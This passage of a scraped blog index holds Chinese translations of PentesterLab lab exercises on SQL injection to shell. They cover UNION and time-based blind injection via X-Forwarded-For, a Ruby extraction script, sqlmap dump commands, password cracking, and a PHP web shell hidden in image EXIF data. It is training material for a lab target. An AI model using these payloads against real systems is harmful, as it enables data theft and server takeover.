例如，让我们使用带d.pentesterlab.com作为我们的dns2tcp服务器。我们将运行以下命令： 在受感染的系统上； 在服务器上。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"From SQL Injection to Shell II","slug":"From-SQL-Injection-to-Shell-II","date":"2015-03-20T06:28:26.000Z","updated":"2019-08-29T06:29:50.630Z","comments":true,"path":"2015/03/20/From-SQL-Injection-to-Shell-II/","link":"","permalink":"https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/","excerpt":"","text":"简介本课程详细介绍一个基于PHP开发的网站的SQL盲注，以及攻击者如何利用它来访问管理页面。然后，使用该访问，攻击者能够通过配置问题获得服务器上的代码执行。 攻击分为3个步骤： 指纹识别：收集在Web应用使用的技术信息。 SQL注入检测和利用：在这一部分中，您将学习SQL盲注的原理以及如何利用它们来获取信息。 访问管理页面和代码执行：最后一步，你将访问操作系统并且运行代码。 如果你感到合适，你可以尝试发现和利用这些漏洞而不按照课程。你可以在之后回到课程来学习一些你可能没有想到的技巧。 一旦你访问Web应用程序，你将看到下面的页面： 指纹识别指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的（通过文件扩展名）。 检查HTTP头部信息大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取，我个人使用netcat，直接通过命令行使用效率更高： 1234567% echo \"HEAD / HTTP/1.1\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80HTTP/1.1 200 OKServer: nginx/0.7.67Date: Wed, 29 May 2013 00:52:49 GMTContent-Type: text/htmlConnection: keep-aliveX-Powered-By: PHP/5.3.3-7+squeeze15 如果你使用 bash ，确保你添加en到命令行：echo -en &quot;HEAD... 我们可以看到，Web服务器使用Nginx并且PHP也被安装了。使用 HEAD 将使你得到所有页面的内容。使用 Connection: close 告诉服务器处理请求后关闭连接。这将确保命令马上返回。 SQL注入检测与利用SQL注入检测该网站提供的SQL注入要找到它有点棘手，尤其是如果你不知道去哪里找。首先，你需要知道SQL注入是盲目的。其次，你不能检测并触发它如果您使用的是浏览器（除了浏览器的扩展用来伪造HTTP流量）。你需要使用一个代理，一个工具（如netcat）或一些代码来找到它。 除了通常的“GPC”猜测：GET参数，POST参数和Cookies；还有其他的值可以用于发现漏洞： User-Agent 。 Host 头。 X-Forwarded-For 和 X-Forwarded-Host 头。 … User-Agent 明显并且易于操作。Host 头有点难度，因为你将需要将主机头从传统的DNS解析中分离出来（（即：您无法直接用浏览器访问[http://‘+or+’1’=’1]/test.php](http://‘+or+’1’=’1]/test.php），因为DNS无法分辨出 ‘+or+’1’=’1）。 注入到主机名，您需要发送您的请求，通过手动或代理在请求中修改 Host 头： 123GET / HTTP/1.1Host: ' or '1'='1[...] 最近，一些公布的漏洞入口点是Host头。一些存在漏洞的函数位于密码重置页面（发送链接是基于Host头）和数据页（页面显示Host的值，没有任何过滤 ）。 通常列表中最后一个是 X-Forwarded-For 头。X-Forwarded-For 是传统用来获取客户端的IP地址。你可能会问为什么PHP代码没有使用TCP连接中的IP地址（例如 $_SERVER[‘REMOTE_ADDR’] ）来代替这个头。X-Forwarded-For 主要用于当应用程序在一个反向代理之后。如果应用使用 $_SERVER[‘REMOTE_ADDR’] 所有请求看起来都是来自于反向代理代替客户（这将打破所有的审计和日志记录机制）。这就是为什么很多应用程序的设计类似于下面的代码： 12345$ip = $_SERVER['REMOTE_ADDR'];if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125; X-Forwarded-For 仅在当应用程序运行在一个反向代理之后时设置，这种代码在大多数情况下工作。然而，这个代码假定攻击者不能伪造这个头。最后，因为开发者认为，IP地址将是一个有效的IPv4地址，他们往往没有进行足够的过滤。 利用这些信息，我们将看到我们如何使用基于时间的SQL盲注。这里的想法是注入一个需要花费很长时间来处理的函数并且观察是否调用该函数，通过观察网页载入的时间。 首先，我们可以很容易地使用命令行发送请求。然而，我们可以看到，发送的有效载荷：hacker ： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 hacker’ ： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker'\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 hacker’ or ‘1’=’1 。hacker’ and ‘1’=’1 。 将得到相同的结果，没有简单的方法来发现这个参数是否可以注入。 幸运的是，我们可以使用基于时间的检测，通过检查时间差发现漏洞。我们可以看到这个有效载荷： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker' or sleep(4) and '1'='1\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 将比这一个花费更多的时间： 1$ echo \"GET / HTTP/1.0\\r\\nX-Forwarded-For: hacker' or sleep(0) and '1'='1\\r\\nConnection: close\\r\\n\\r\\n\" | netcat vulnerable 80 作为使用 ‘1’=’1 结束语句的代替，你可以使用 # 。使用 – 注释掉之后的语句将不工作（用于检索header的函数将除去 – 之后的空格），除非你使用 – -来确保保留空格。 使用 and sleep… 代替 or sleep… 也很重要，MySQL不会执行 sleep() ，如果第一部分（匹配 ip）没有返回 true 。因为我们使用的 hacker （之前没有使用过），它将返回 false 并且 sleep… 会被执行。MySQL的确很聪明，不会测试： Y in X and Y if X returns false. Y in X or Y if X returns right. 你会经常需要到处闲逛以确保代码是很脆弱的，你不要让这种行为变化干扰到。 基于这种差异（之后多测试几次，以确保它不是由于连接的速度），我们可以肯定，这个网站很容易受到SQL注入。 默认情况下，sqlmap并不会测试X-Forwarded-For头的SQL注入。你需要知道工具的局限性并且知道该从哪里开始。 SQL盲注利用手工利用我们要利用传统的SQL盲注，我们有2种情况（true/slow 和 false/quick），基于此，我们可以检索信息。 首先，我们要使用 select @@version 检索一行。一旦我们知道如何去做，我们可以多行。 在这里我们要检索数据库的版本 select @@version 。为此，我们需要获取每个字符的每个字节，通过 select @@version 。 我们的版本是5.0.4，我们需要选择这个字符串的所有字符，通过使用MySQL函数 substring ： 既然我们知道如何提取每个字母（字节）；我们现在就需要提取每个字节的每一位。作为一个例子，让我们看看它如何能做到，以值 5 为例。首先我们需要得到的 5 的ASCII码值使用MySQL函数 *ascii *： 123456mysql&gt; SELECT ascii(&#39;5&#39;);+----------+| ascii(5) |+----------+| 53 |+----------+ 现在，我们需要检索在每个位的值。53 可以代表的二进制值： 00110101 。我们可以使用一个比特位分离出其他内容。分离和检索每一位之后，我们可以在攻击者这边重新构建这个值。 首先，我们需要基础boolean与（&amp;）怎么工作： 我们将使用这些属性来分离每个比特的信息。 我们可以使用 &amp;1 分离第一位： 返回值为第一位是1。此值将产生一个 true 的状态和响应将是缓慢的。 &amp; 用于分离，1用于指明第一位。作为一个说明：2 ^ 0等于1。 我们可以使用 &amp;2来移动到第二位（2^1 等于 2）： 返回值为第二位是0。0将产生一个 false 的状态并且响应会很快。 我们可以继续移动到第三位通过 &amp;4 （2^2 等于 4）： 返回值为第三位1。4值将产生一个 true 的状态并且响应将被推迟。 我们可以继续获取第一个字节的所有位。对于每一位，你将需要添加值（它的结果是true）作为一个变量。这个变量将包含最后的字节，当你检索所有位之后。 我们可以把一切都在2个循环中，每一个字符和当前字符的每一位： 12345678910111213141516171819202122232425262728293031323334353637383940414243require 'socket'inj = \"select @@version\"str = \"\" def test(sql) p = \"hacker' or if((#&#123;sql&#125;),sleep(0.5),0) and '1'='1\" t = Time.now begin s = TCPSocket.new(\"vulnerable\",80) s.write(\"GET / HTTP/1.1\\r\\nHost: vulnerable\\r\\nX-Forwarded-For: #&#123;p&#125;\\r\\nConnection: close\\r\\n\\r\\n\") s.readlines() s.close rescue Errno::ECONNRESET, EOFError end return ((Time.now-t)&gt;0.5)end# dummy initialisation for the while loop# we loop until the returned value is nullvalue = 1i = 0while value != 0 # i is the position in the string i+=1 # initialise to 0 the value we are trying to retrieve value = 0 # for each bit 0.upto(6) do |bit| # 2**bit is 2^bit and will do all the bit masking work sql = \"select ascii(substring((#&#123;inj&#125;),#&#123;i&#125;,1))&amp;#&#123;2**bit&#125;\" if test(sql) # if the returned value is true # we add the mask to the current_value value+=2**bit end end # value is an ascii value, we get the corresponding character # using the `.chr` ruby function str+= value.chr puts strend 你可以通过检索每个结果的大小在开始之前完善这个脚本。停在一个NULL值，不可能正常工作的二进制位置。 现在我们已经有了脚本来检索单行。我们需要改进，使它能够处理多行，可以获取所有的用户。 但首先，让我们看看用户是如何连接数据库，看是否能找到一条捷径去执行代码。了解使用的用户，我们只需要替换我们的有效载荷： 1inj = \"select user()\" 然后运行我们的脚本获取结果： 1234567891011% ruby course/exploit.rbppepenpentpentepentespentestpenteste[...]pentesterlab@localhost 这个用户看起来并没有 FILE 权限。在另一项练习，我们将看到我们如何检查并且得得它的代码执行。 要获取多个行，我们只需要添加另一个循环到脚本中，每次检索一行。我们可以分离每一行行通过使用SQL关键字 LIMIT 。下表说明了 LIMIT 行为： 注：as id 只是用来使MySQL输出更容易阅读。 现在我们知道了如何分离每一行。我们可以通过循环每一行获取所有的结果。我们只需要： 添加一个 index 循环（我们只想要前10个结果）。 在我们的载荷中使用 index 来限制结果的数量。 在获取新行之前重置变量 value ，i 和 str 。 修改后的代码： 1234567891011121314151617index = 0 while index &lt; 10 # using a new variable for the new payload to keep things simple newinj = inj + \" limit #&#123;index&#125;,1\" i = 0 str =\"\" value = 1 while value != 0 [...] 0.upto(6) do |bit| # using the new variable sql = \"select ascii(substring((#&#123;newinj&#125;),#&#123;i&#125;,1))&amp;#&#123;2**bit&#125;\" [...] end index+=1end 当脚本开始循环，你可以杀死它移动到下一个请求。 你可以修改行数在开始运行之前来改善这个脚本。 现在我们知道了如何检索多行，我们可以使用脚本来转储： 表的列表：SELECT table_name FROM information_schema.tables 列的列表：SELECT column_name FROM information_schema.columns 最终，只通过修改载荷来获取信息。 12inj = \"select concat(login,':'password) from users \"[...] 我们可以获取登录密码： 123456789101112131415% ruby exploit.rbaadadmadmiadminadmin:admin:8admin:8eadmin:8efadmin:8efeadmin:8efe3admin:8efe31[...]admin:8efe310f9ab3efeae8d410a8e0166eb2 现在你已经知道了如何手工利用，接下来我们看一下如何使用SQLMap来做到相同的效果。 使用SQLMap进行注入你也可以使用SQLMap来利用这个漏洞。语法是有点棘手，你需要告诉sqlmap在注入点使用 *。这可以通过以下命令： 1$ python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" --banner 测试不同的SQL注入方法之后，SQLMap返回如下旗标： 12345678910111213sqlmap identified the following injection points with a total of 109 HTTP(s) requests:---Place: (custom) HEADERParameter: X-Forwarded-For #1* Type: AND/OR time-based blind Title: MySQL &gt; 5.0.11 AND time-based blind Payload: ' AND SLEEP(5) AND \\'tYCW\\'=\\'tYCW[...][14:14:18] [INFO] adjusting time delay to 1 second due to good response times5.1.66-0+squeeze1web application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5.0.11banner: '5.1.66-0+squeeze1\\' 我们现在可以获取想要的信息： –dbs 获取数据库列表。 如下： 1234% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" --dbsavailable databases [2]:[*] information_schema[*] photoblog -D photoblog –tables获取表的列表。 如下： 123456789% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" -D photoblog --tablesDatabase: photoblog[4 tables]+------------+| categories || pictures || stats || users |+------------+ -D photoblog -T users –columns获取列的列表。 如下： 1234567891011% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" -D photoblog -T users --columnsDatabase: photoblogTable: users[3 columns]+----------+-------------+| Column | Type |+----------+-------------+| id | mediu || login | varchar(50) || password | varchar(50) |+----------+-------------+ 使用选项--batch告诉SQLMap使用默认行为，避免用户数据。 最后，你可以转储表 users （SQLMap将允许你自动破解密码）用以下命令： 123456789% python sqlmap.py -u \"http://vulnerable/\" --headers=\"X-Forwarded-For: *\" -D photoblog -T users --dump --batchDatabase: photoblogTable: users[1 entry]+----+-------+---------------------------------------------+| id | login | password |+----+-------+---------------------------------------------+| 1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |+----+-------+---------------------------------------------+ 你也可以使用 –dump-all 如果你想得到所有的数据库内容（可能很慢）。你也可以使用 –exclude-sysdbs 避免转储系统数据库/表而只检索那些默认不存在的。 访问管理页面和代码执行进入管理界面的第一步是破解你获取到的密码。除非你已经用SQLMap破解了它，你可以使用这个练习的第一个版本，按照提供的步骤。否则，你可以使用谷歌来破解它。 上传WebShell并且执行代码当你遇到一个上传功能，下面的步骤可以遵循的： 确保文件上传在web根目录（所以你可以访问它并且得到它的解析）。 确保代码检查的文件扩展名，它不能绕过。 确保代码检查的内容类型，它不能绕过。 通过使用一个合法的图像（.png , .jpg 或 .gif 文件），我们可以看到，文件会在网站根目录上传，被改名为基于当前时间，该文件的扩展名仍然保持。 如果你想上传一个PHP扩展名文件，不同于.png , .jpg 或 .gif 。文件会被拒绝。看起来不能绕过。 如果你想上传一个文件以正确的扩展名但没有合适的内容（如文本文件命名为 test.jpg ），文件也被拒绝。 最后，如果你想上传一个文件以正确的扩展，正确的内容但有一个小的内容修改（用 vi 添加额外的话），该文件也被拒绝了。 唯一的可能是上传一个有效的文件去执行代码。我们还注意到，该文件没有被PHP代码调整大小。 2010年， 80sec.com 发布了nginx文件类型错误解析漏洞http://www.80sec.com/nginx-securit.html（中文）。这个问题也在Neal Poole in 2011https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/进行过详细的说明。 基本上，如果Nginx/PHP配置不正确，当有人访问URL：http://vulnerable/admin/uploads/hacker.png/x.php时，文件 hack.png 会被解析成PHP代码。 我们可以利用这个错误配置获得代码执行在服务器上仅仅通过上传恶意的图像。然而，在我们测试之前，该文件必须是一个有效的图像。我们需要找到一种方法将PHP代码注入到图像的同时保持一个有效的文件。 一个简单的方法是把我们的有效载荷内作为一个评论注入到图像的EXIF区域。这可以通过使用工具 exiftool 做到。gd库被很多PHP应用用来删除EXIF数据，当图像被调整大小。幸运的是，这里的情况不是这样的，。它仍然是值得测试的因为很多人（特别是照片）想要保留这些信息，即使图像可以调整大小，仍然决定离开gd到ImageMagick。 首先，我们需要创建载荷（shell.php）： 1&lt;?php system($_GET['c']); ?&gt; 然后我们可以使用 exiftool 把我们的载荷注入到图像中： 1% exiftool \"-comment&lt;=shell.php\" malicious.png 最后，我们需要确保一切都是好的（在调试浪费时间之前）： 12% strings malicious.png | grep system&lt;?php system($_GET['c']); ?&gt; 我们现在可以上传自己的图像。一旦上传，我们需要通过检查网页的源文件来检索路径。我们可以通过添加“PHP扩展”和我们要运行的命令来访问图像。例如，如果上传的文件被命名为 1369904954.png ,我们可以访问http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a来执行代码。 总结这个练习将教你如何手动检测和利用SQL盲注获得一个网站管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。这个练习是一个很好的例子有多小技巧可以影响Web服务器的性能并且允许攻击者控制它。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"From SQL Injection to Shell","slug":"From-SQL-Injection-to-Shell","date":"2015-03-16T07:11:07.000Z","updated":"2019-08-28T07:12:13.358Z","comments":true,"path":"2015/03/16/From-SQL-Injection-to-Shell/","link":"","permalink":"https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/","excerpt":"","text":"简介课程内容：基于PHP的站点的SQL注入，攻击者可以使用它来访问管理页面。然后，使用该访问，攻击者就能获得服务器上的代码执行。 攻击分为3个步骤： 指纹识别：收集Web应用的技术信息。 SQL注入检测和利用：在这一部分中，您将学习SQL注入的原理和如何利用它们来获取信息。 访问管理页面和代码执行：最后一步，您将访问操作系统和运行命令。 指纹识别指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的。 检查HTTP头部信息大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取： 1$ telnet vulnerable 80 PS： vulnerable是主机名或服务器的IP地址； 80是由Web应用程序使用的TCP端口（80是HTTP默认值）。 通过发送以下HTTP请求： 12GET / HTTP/1.1Host: vulnerable 它有可能获取到PHP版本和Web服务器信息，仅仅通过观察服务器发送回的HTTP响应报头的： 1234567HTTP/1.1 200 OKDate: Thu, 24 Nov 2011 04:40:51 GMTServer: Apache/2.2.16 (Debian)X-Powered-By: PHP/5.3.3-7+squeeze3Vary: Accept-EncodingContent-Length: 1335Content-Type: text/html 这里的应用程序只能通过HTTP（没有运行在端口443）。如果应用程序只能通过HTTPS，telnet或netcat就无法与服务器进行通信，可以使用openssl工具： 1$ openssl s_client -connect vulnerable:443 PS： vulnerable是主机名或服务器的IP地址； 443是由Web应用程序使用的TCP端口（443是HTTPS的默认值）。 使用应用程序如Burp Suite（http://portswigger.net/）设置为代理可以很容易地获取相同的信息： 使用目录扫描wfuzz工具（http://www.edge-security.com/wfuzz.php）可以用来暴力检测Web服务器上的目录和页面。下面的命令可以检测远程文件和目录： 1$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ 使用以下选项： –hc 404 告诉wfuzz如果响应代码404则忽略响应（页面未找到） -z file -f wordlists/big.txt 告诉wfuzz文件使用文件 wordlists/big.txt 作为字典破解远程目录的名称。 http://vulnerable/FUZZ 告诉wfuzz在URL中替换 FUZZ 的每个在字典中找到的值。 wfuzz也可以用来检测服务器上的PHP脚本： 1$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php SQL注入检测SQL入门为了理解，检测和利用SQL注入，你需要了解标准查询语言（SQL）。SQL允许开发人员执行以下需求： 使用 SELECT 语句检索信息； 使用 UPDATE 语句更新信息； 使用 INSERT 语句添加新的信息； 使用 DELETE 语句删除信息。更多的操作（创建/删除/修改表，数据库或触发器）是可用的但不太可能被用于Web应用程序。 网站最常用的查询语句是 SELECT ，用于从数据库中检索信息。 SELECT 语句的语法如下： 1SELECT column1, column2, column3 FROM table1 WHERE column4='string1' AND column5=integer1 AND column6=integer2; 在该查询中，以下信息提供给数据库： SELECT语句表示要执行的操作：检索信息； 列的列表显示哪些列被请求； FROM table1 表示从哪一个表获取记录； 语句之后的 WHERE 是用来指示记录应满足什么条件。string1 的值是由单引号限定，整数 integer1 和 integer2 可以通过一个单引号分隔（ integer2 ）或直接放在查询中（ integer1 ）。 例如下面的请求： 1SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4; 会从下面的表中检索： 使用之前的查询语句，下面的结果将被检索： 我们可以看到，只有这些值被返回，因为它们是匹配所有 WHERE 中的声明条件。如果你阅读一些处理数据库的源代码，你会经常看到 SELECT * FROM tablename 。 * 是一个通配符请求数据库返回所有列并避免指明它们的名称。 基于整数检测由于显示错误信息，很容易检测到网站的任何漏洞。SQL注入可以使用任何下列方法检测。所有这些方法都是基于数据库的一般行为，发现和利用SQL注入取决于很多不同的因素，这些方法本身并不是100%的可靠。这就是为什么你需要尝试它们中的几种去确定给定的参数是存在漏洞的。让我们以一个购物网站为例子，访问的URL /cat.php?id=1，你会看到图片article1。下表显示你会看到的不同的ID值： 后台的PHP代码如下： 123456&lt;?php$id = $_GET[\"id\"];$result= mysql_query(\"SELECT * FROM articles WHERE id=\".$id);$row = mysql_fetch_assoc($result);// ... display of an article from the query result ...?&gt; 用户提供的值（ $_GET[“id] ）被直接用于SQL请求语句中。例如，访问的URL： /article.php?id=1 将产生以下请求： SELECT * FROM articles WHERE id=1 /article.php?id=2 将产生以下请求： SELECT * FROM articles WHERE id=2如果用户试图访问URL /article.php?id=2&#39; ，下列请求将被执行 SELECT * FROM articles WHERE id=2&#39; 。然而，这个SQL请求因为单引号，语法错误，数据库将抛出一个错误。例如，MySQL会抛出如下错误信息： You have an error in your SQL syntax; check themanual that corresponds to your MySQL serverversion for the right syntax to use near&#39;&#39;&#39; at line 1 此错误消息是否在HTTP响应中可见取决于PHP配置。 在URL中提供的值是直接用于请求语句并且被视为一个整数，这允许你查询数据库并且执行基本的数学运算： 如果你试图访问 /article.php?id=2-1 ，下面的请求将被发送到数据库 SELECT * FROM articles WHERE id=2-1 ，并且article1的信息将在网页上显示，因为这次查询等价于 SELECT * FROM articles WHERE id=1 （减法将由数据库自动执行）。 如果你试图访问 /article.php?id=2-0 ，下面的请求将被发送到数据库 SELECT * FROM articles WHERE id=2-0 ，并且article2的信息将在网页上显示，因为这次查询等价于 SELECT * FROM articles WHERE id=2 。 这些特性提供了一个很好的检测SQL注入的方法： 如果访问 /article.php?id=2-1 显示article1并且访问 /article.php?id=2-0 显示article2，减法是由数据库来完成的，那么你可能发现了一个SQL注入。 如果访问 /article.php?id=2-1 显示article2并且访问 /article.php?id=2-0 也显示article2，你可能没有一个基于整数的SQL注入，但你可能有一个基于字符串的SQL注入，正如我们将看到的。 如果你把一个引号放入URL中（ /article.php?id=1&#39; ），你应该收到一个错误。 如果一个值是一个整数（例如categorie.php?id=1），它可以被当作字符串用于SQL语句中：SELECT * FROM categories where id=&#39;1&#39;.这是SQL允许使用的语法，但在SQL语句中使用字符串会比使用整数慢。 基于字符串检测正如我们之前在“SQL入门”中看到的，SQL语句中的字符串值被放在引号当中（例如&#39;test&#39;）： 1SELECT id,name FROM users where name='test'; 如果SQL注入是在网页中，注入一个单引号 &#39; 将打破查询语法并且产生错误。另外，注入2次单引号 &#39; &#39; 不会打破查询。作为一般规则，奇数单引号将抛出一个错误，偶数单引号不会。 它也可以注释掉查询语句的末尾，因此在大多数情况下，你不会得到一个错误（这取决于查询的格式）。你可以用 &#39;– 来注释掉末尾。 例如下面的查询，在test处有一个注入点： 1SELECT id,name FROM users where name='test' and id=3; 会变成： 1SELECT id,name FROM users where name='test' -- ' and id=3; 并且会被解释为： 1SELECT id,name FROM users where name='test' 然而这个测试仍然可能产生一个错误，如果查询如下模式： 1SELECT id,name FROM users where ( name='test' and id=3 ); 由于右括号会因为末尾的注释而消失。你可以尝试一个或多个括号来查找一个值使它不会产生错误。 另一种方式来测试它，是使用 &#39; and &#39;1&#39;=&#39;1 ，这种注入不太可能影响查询，因为它不太可能打破语法。例如，在之前的查询中采用这种方式注入，我们可以看到语法仍然是正确的。 1SELECT id,name FROM users where ( name='test' and '1'='1' and id=3 ); 此外， &#39; and &#39;1&#39;=&#39;1 不太可能影响的请求和结果，因为有没有注入的语义可能是相同的。我们可以通过使用注入 &#39; and &#39;1&#39;=&#39;0 产生的页面来与它比较，虽然并没有产生错误，但改变了查询的语义。SQL注入并不是一门精确的科学，很多东西都会影响到你的测试结果。如果你遇到这些，继续测试注入，尝试测试出后台代码来确认它是一个SQL注入。为了找到SQL注入，你需要访问网站并且使用这些方法测试每一个页面的每一个参数。一旦你发现了SQL注入，你可以到下一节去学习如何利用它。 SQL注入利用现在我们网页 http://vulnerable/cat.php 发现了一个SQL注入，为了更进一步，我们需要利用它来检索信息。为此，我们需要了解SQL中使用的 UNION 关键字。 UNION关键字 UNION 声明是用来把两次请求的信息放在一起： 1SELECT * FROM articles WHERE id=3 UNION SELECT ... 因为它是用来从其他表中检索信息，它可以用来作为一个SQL注入的有效载荷。请求的开始不能被攻击者直接修改，因为它是由PHP代码生成的。然而使用UNION，攻击者可以操纵查询的结束并且从其他表中检索信息： 12SELECT id,name,price FROM articles WHERE id=3 UNION SELECT id,login,password FROM users 最重要的规则是两次查询返回的列的类型相同，否则数据库将触发一个错误。 使用UNION利用SQL注入使用UNION利用SQL注入遵循下面的步骤： 找出列数用来执行UNION 找出哪些列被显示在页面上 从元表数据库中检索信息 从其他表或数据库中检索信息 为了执行SQL注入的请求，你需要找到所查询的第一部分返回的列数。你需要猜这个数，除非你有应用程序的源代码。 有两种方法得到这个信息： 使用 UNION SELECT 和增加列数； 使用 ORDER BY 语句。 如果你尝试 UNION 并且两个查询返回的列数是不同的，数据库将抛出一个错误： 1The used SELECT statements have a different number of columns 可以使用这个属性来猜列数。例如，如果你可以注入以下语句： SELECT id,name,price FROM articles where id=1 ，你可以采用以下步骤： SELECT id,name,price FROM articles where id=1 UNION SELECT 1 ,注入内容 1 UNION SELECT 1 将返回一个错误因为查询语句的两个子部分的列数是不同的； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2 ，因为如上同样的原因，注入内容 1 UNION SELECT 1,2 会返回一个错误； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 ，因为两个子部分拥有相同的列数，此查询不会抛出错误。你甚至可以在页面或页面的源代码中，看到一个数字。 注：本项目为MySQL，使用的的方法与其他数据库略有不同，值1,2,3…应该改成null,null,null…,如果数据库要求 UNION 两边的部分相同的值类型。例如Oracle，当使用SELECT时需要使用FROM，可以使用dual表来完成请求： UNION SELECT null,null,null FROM dual 另一种方法是利用关键字 ORDER BY 。 ORDER BY 主要用来告诉数据库哪些列被用于排序结果： 1SELECT firstname,lastname,age,groups FROM users ORDER BY firstname 上述请求将返回users表按照firstname排序后的结果。 ORDER BY 也可以用一个整数告诉数据库排序的列数 X： 1SELECT firstname,lastname,age,groups FROM users ORDER BY 3 上述请求将返回users表按照第3列排序后的结果。此功能可用于检测列数，如果表中的列数大于 ORDER BY 查询中的列数，则抛出一个错误（例如10）： 1Unknown column '10' in 'order clause' 可以使用这个属性来猜列数。例如，如果你可以注入以下语句： SELECT id,name,price FROM articles where id=1 ，你可以采用以下步骤： SELECT id,name,price FROM articles where id=1 ORDER BY 5 ，注入内容 1 ORDER BY 5 将返回一个错误，因为查询的第一部分列数小于5； SELECT id,name,price FROM articles where id=1 ORDER BY 3 ，注入内容 1 ORDER BY 3 不会返回错误，因为查询的第一部分列数大于或等于3； SELECT id,name,price FROM articles where id=1 ORDER BY 4 ，注入内容 1 ORDER BY 4 将返回一个错误，因为查询的第一部分列数小于4。 基于这种二分法的搜索，我们可以知道列数是3，我们现在可以利用这些信息来建立最终的查询： 1SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 尽管在本例中这种方法使用了相同的请求数，但它的速度会明显加快，当列数增长时。 检索信息现在我们已经知道了列数，我们可以从数据库中检索信息。基于我们收到的错误信息，我们知道后台使用的数据库是 MySQL 。利用这些信息，我们可以迫使数据库执行一个函数或给我们发送信息： 通过PHP应用程序连接到数据库的用户信息，使用 current_user() 数据库版本信息，使用 version() 为了实现这些，我们需要在之前的语句（ UNION SELECT 1,2,3 ）中用我们想要执行的函数替换掉一个值，然后在响应中检索信息。确保你总是保持列数正确当你试图检索信息时。 例如你可以访问以下URL来获取这些信息： 数据库版本： http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4 当前用户： http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4 当前数据库： http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4 我们现在能够从数据库中检索信息并且检索任意内容。为了获取当前应用程序的相关信息，我们需要： 当前数据库中的所有表的名称 我们想要从中检索信息的表中列的名称 MySQL提供了包含有关数据库，表，列信息的元信息表，MySQL 5版本及以上。我们将使用这些表来获取我们需要的最终要求信息。这些表存储在数据库 information_schema 中。下面的查询可用于检索： 所有表的列表： SELECT table_name FROM information_schema.tables 所有列的列表： SELECT column_name FROM information_schema.columns 通过混合这些查询和以前的URL，你可以猜出什么网页访问用于信息检索： 表的列表： 1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables 列的列表： 1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns 问题是，这些查询语句为您提供所有表和列的列表，但在数据库中查询和检索感兴趣的信息，你需要知道哪些列属于哪些表。幸好， information_schema.columns 表中储存有列名。 1SELECT table_name,column_name FROM information_schema.columns 获取这些信息，我们可以 把表名和列名放在不同的注射位置： 1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns 在同一个注入位置使用 CONCAT 连接表名和列名： 1 UNION SELECT 1,concat(table_name,&#39;:&#39;, column_name),3,4 FROM information_schema.columns 。 &#39;:&#39; 很容易分割查询结果。 如果你想轻松的在结果页面使用正则表达式检索信息（比如你想写一个SQL注入的脚本），你可以使用一个标记在注入内容 ``1 UNION SELECT 1,concat(‘^^^’,table_name,’:’,column_name,’^^^’) FROM information_schema.columns` 中。它很容易在页面中匹配结果。 你现在有表和它们的列的列表，第一个表和列是默认的MySQL表。在HTML页面的最后，我们可以看到一个表的列表可能被目前的应用所使用： 使用此信息，您现在可以创建一个查询，从该表中检索信息： 11 UNION SELECT 1,concat(login,':',password),3,4 FROM users; 并获取用户名和密码用于访问管理页面： 该SQL注入提供和访问数据库连接的应用程序使用用户相同的权限(current_user())…这就是为什么当你在部署WEB应用的时候尽可能给它的用户最低权限。 访问管理页面和代码执行 破解密码使用2种不同的方法可以很容易的破解密码： 一个搜索引擎 John-The-Ripper http://www.openwall.com/john/ 如果哈希值无盐，它可以轻易被破解，通过使用搜索引擎像谷歌。因为，只要搜索哈希，你将在很多网站看到你的密码的明文版： John-The-Ripper可以用来破解这个密码，最现代的Linux发行版包括一个版本的John，为了破解这个密码，你需要告诉John什么算法被用于加密。对于Web应用程序，一个好的猜测是MD5。在大多数的Linux发行版中，只提供支持少数格式的John-The-Ripper版本。你可以运行John不带任何参数，从使用信息中获取支持的格式列表。例如在Fedora，支持以下格式： 1234$ john# ...usage 